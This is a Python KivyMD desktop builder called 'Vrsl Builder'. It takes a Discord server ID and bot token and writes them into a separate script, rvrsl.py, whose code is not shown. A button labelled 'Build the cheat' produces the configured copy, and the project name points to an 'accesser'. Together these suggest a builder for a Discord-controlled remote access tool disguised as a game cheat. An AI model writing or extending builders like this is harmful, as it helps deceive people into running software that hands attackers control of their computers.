from kivymd.app import MDApp
from kivymd.uix.boxlayout import MDBoxLayout
from kivymd.uix.label import MDLabel
from kivymd.uix.textfield import MDTextField
from kivymd.uix.button import MDRaisedButton
from kivy.uix.image import AsyncImage
import ctypes
source_path = ''#ENTER THE PATH TO rvrsl.py
class GUIBuilder(MDBoxLayout):
    def __init__(self, **kwargs):
        super().__init__(orientation="vertical", padding=10, spacing=10, **kwargs)

        title_label = MDLabel(text='Vrsl Builder', halign="center", font_style="H5")
        self.add_widget(title_label)

        server_id_label = MDLabel(text='Server ID:')
        self.add_widget(server_id_label)
        self.server_id_input = MDTextField()
        self.add_widget(self.server_id_input)

        bot_token_label = MDLabel(text='Bot Token:')
        self.add_widget(bot_token_label)
        self.bot_token_input = MDTextField()
        self.add_widget(self.bot_token_input)

        image = AsyncImage(source='https://raw.githubusercontent.com/wevls/rvrsl-accesser/refs/heads/main/logo.png')
        self.add_widget(image)

        save_button = MDRaisedButton(
            text='Build the cheat',
            on_release=self.save_configuration,
            size_hint_x=1
        )
        self.add_widget(save_button)

    def save_configuration(self, instance):
        server_id = self.server_id_input.text
        bot_token = self.bot_token_input.text

        with open(source_path, 'r') as source_file:
            source_code = source_file.read()

        updated_source_code = source_code.replace('guild_id = ""', f'guild_id = "{server_id}"')
        updated_source_code = updated_source_code.replace('token = ""', f'token = "{bot_token}"')

        with open('rvrsl.py', 'w') as script_file:
            script_file.write(updated_source_code)

        ctypes.windll.user32.MessageBoxA(0, "Vrsl has been built to!".encode('utf-8'), "rvrsl".encode('utf-8'), 1)

class GUIBuilderApp(MDApp):
    def build(self):
        return GUIBuilder()

if __name__ == '__main__':
    GUIBuilderApp().run()
